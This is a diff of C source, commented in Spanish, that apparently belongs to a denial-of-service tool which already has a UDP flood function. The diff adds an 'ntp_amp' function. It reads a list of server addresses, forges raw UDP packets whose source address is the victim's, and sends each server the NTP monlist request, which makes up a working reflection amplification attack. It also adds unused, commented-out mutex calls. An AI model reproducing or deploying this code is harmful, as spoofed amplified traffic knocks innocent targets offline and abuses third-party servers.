@@ -9,14 +9,18 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <pthread.h>
 #include "./includes/checksum.h"
 #include "./includes/udp.h"
 #include "./includes/tcp.h"
+
+extern pthread_mutex_t lock;
 
 #define DATAGRAM_LEN 4096
 
 // Funcion que crea un datagrama UDP con la direccion de origen, destino y payload proporcionos
 void udp_datagram(struct sockaddr_in* src, struct sockaddr_in* dst, char** datagram_ret, int* datagram_len, char* mensaje){
+	//pthread_mutex_lock(&lock);
 
     char *data , *pseudogram;
 
@@ -74,9 +78,13 @@ void udp_datagram(struct sockaddr_in* src, struct sockaddr_in* dst, char** datag
 	
 	udph->check = csum( (unsigned short*) pseudogram , psize);
 
+	
+
     *datagram_ret = datagram;
 	*datagram_len = iph->tot_len;
 	free(pseudogram);
+
+	//pthread_mutex_unlock(&lock);
 }
 
 void udp_flood(int sock, char* src, char* dst, int puerto, char* mensaje){
@@ -177,4 +185,62 @@ void udp_dns(struct sockaddr_in* src, struct sockaddr_in* dst, char** datagram_r
 
     *datagram_ret = datagram;
 	*datagram_len = iph->tot_len;
+}
+
+void ntp_amp(int sock, char* addr_src){
+	// Leemos las ips de servidores ntp
+	FILE* mem_servers = fopen("./listas/memcached-servers.txt", "r");
+	if (mem_servers == NULL) {
+		printf("Failed to open the file.\n");
+		exit(1);
+	}
+
+	char linea[256];
+	while (fgets(linea, sizeof(linea), mem_servers) != NULL) {
+
+		// Quitamos el salto de linea de las ips de la lista
+		size_t len = strlen(linea);
+		if (len > 0 && linea[len - 1] == '\n') {
+			linea[len - 1] = '\0';
+		}
+
+		// direccion IP de destino
+		struct sockaddr_in daddr;
+		if(host_addr(&daddr, linea, 123) == 1){
+			perror("Error al crear la configuracion IP");
+            exit(1);
+		}
+
+		// direccion IP de origen
+		struct sockaddr_in saddr;
+		if(host_addr(&saddr, addr_src, (rand() % 6000)) == 1){
+			perror("Error al crear la configuracion IP");
+            exit(1);
+		}
+
+		// Comando monlist: devuelve el monitoreo de los datos del servidor ntp
+		char ntp[8];
+		ntp[0] = 0x17;
+		ntp[1] = 0x00;
+		ntp[2] = 0x03;
+		ntp[3] = 0x2A;
+		ntp[4] = 0x00;
+		ntp[5] = 0x00;
+		ntp[6] = 0x00;
+		ntp[7] = 0x00;
+
+		// Creamos datagrama udp con el comando monlist
+		char* datagram;
+		int datagram_len;
+		udp_datagram(&saddr, &daddr, &datagram, &datagram_len, ntp);
+		
+		if(sendto (sock, datagram, datagram_len ,	0, (struct sockaddr*)&daddr, sizeof(struct sockaddr)) < 0)
+		{
+			perror("No se ha podido enviar el datagrama");
+		} else {
+			printf ("Datagrama enviado. Tamaño : %d \n" , datagram_len);
+		}
+	}
+
+	fclose(mem_servers);
 }
